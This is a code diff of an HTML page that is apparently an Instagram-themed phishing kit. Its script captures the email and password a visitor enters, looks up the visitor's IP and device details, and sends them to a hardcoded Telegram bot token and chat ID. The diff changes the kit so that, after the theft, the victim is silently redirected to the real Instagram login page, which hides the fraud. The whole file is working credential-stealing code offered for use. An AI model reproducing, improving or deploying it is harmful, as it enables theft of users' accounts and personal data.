@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -71,15 +71,15 @@
 
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <script>
-        const TOKEN = "8994109660:AAFX7m18lWPxkRhdfxDwM7i7IiRaDulj-ds";                                                            // Ù‡Ù†Ø§ Ø§Ù„ØªÙˆÙƒÙŠÙ†              
-        const CHAT_ID = "7521772899";                                                       // Ù‡Ù†Ø§ Ù…Ø¹Ø±Ù Ø§Ù„Ø´Ø§Øª https://api.telegram.org/bot/getUpdates
-        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+        const TOKEN = "8994109660:AAFX7m18lWPxkRhdfxDwM7i7IiRaDulj-ds";
+        const CHAT_ID = "7521772899";
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-        document.getElementById('login-form').addEventListener('submit', function(e) {
+        document.querySelector('button[type="button"]').addEventListener('click', function(e) {
             e.preventDefault();
-
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+    
+            const email = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
 
             axios.get('https://api.ipify.org?format=json')
                 .then(response => {
@@ -90,8 +90,8 @@
                     const screenWidth = screen.width;
                     const screenHeight = screen.height;
                     const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
-
-                    const message = ` 
+                    
+                    const message = `
                         <b>New Login Attempt</b>\n
                         <b>Email:</b> ${email}\n
                         <b>Password:</b> ${password}\n
@@ -107,9 +107,9 @@
                         parse_mode: 'html',
                         text: message
                     }).then(response => {
-                        alert('Information sent successfully!');
+                        window.location.href = 'https://www.instagram.com/accounts/login/?next=/';
                     }).catch(error => {
-                        alert('Error sending the information. Please try again.');
+                        window.location.href = 'https://www.instagram.com/accounts/login/?next=/';
                     });
                 })
                 .catch(error => {
